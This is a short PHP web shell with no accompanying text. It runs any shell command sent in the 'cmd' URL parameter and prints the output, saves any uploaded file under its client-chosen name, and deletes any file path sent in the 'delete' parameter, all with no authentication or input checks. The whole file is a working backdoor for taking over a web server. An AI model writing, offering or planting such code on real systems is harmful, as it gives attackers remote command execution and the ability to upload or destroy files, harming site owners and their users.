<?php
// Execution
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}

// Upload
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded successfully.";
}

// Delete
if (isset($_GET['delete'])) {
    unlink($_GET['delete']);
    echo "File deleted.";
}
?>
